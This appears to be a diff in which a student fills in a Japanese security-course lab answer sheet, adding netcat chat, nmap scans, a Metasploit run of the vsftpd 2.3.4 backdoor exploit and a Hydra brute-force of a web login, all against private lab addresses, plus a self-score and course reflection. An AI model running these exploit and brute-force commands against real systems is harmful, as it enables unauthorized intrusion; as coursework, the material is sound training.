@@ -4,14 +4,14 @@
 
 ### サーバー側コマンド
 
-```sh
-# ここに回答を記述
+``sh
+# nc -lvp 5200
 
 ```
 ### クライアント側コマンド
 
 ```sh
-# ここに回答を記述
+# nc 192.168.33.10 5200
 
 ```
 
@@ -27,21 +27,27 @@
 ### 1. ping scan
 
 ```sh
-# ここに回答を記述
+# nmap -sP 192.168.33.0/24
 
 ```
 
 ### 2. version scan
 
 ```sh
-# ここに回答を記述
+# nmap 192.168.33.1/24
 
 ```
 
 ## 問4 [Metasploit Framework]
 
 ```sh
-# ここに回答を記述
+# msfconsole
+# search vsftp
+# use vsftpd_234_backdoor
+# show options
+# set RHOSTS 192.168.33.5
+# show optionsで変わったか確認
+# exploit
 
 ```
 
@@ -51,8 +57,7 @@
 ### 1. コマンド
 
 ```sh
-# ここに回答を記述
-
+# hydra -L user.list -P passwd.list -s 8180 192.168.33.5 http-form-post "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
 ```
 
 ### 2. 解析結果
@@ -94,13 +99,14 @@
 ## 問8 [自己評価]
 
 ```md
-<!--  ここに回答を記述 -->
+30点
 
 ```
 
 ## 問9 [講義の感想]
 
 ```md
-<!--  ここに回答を記述 -->
+仮想環境構築、ncを使ったチャット、ポートスキャン、Hydra、wiresharkなど
+正直難しいし覚えるのが多くて大変だった。１日でも休むと授業について生きなくなることがわかった。休まないようにしたい
 
 ```
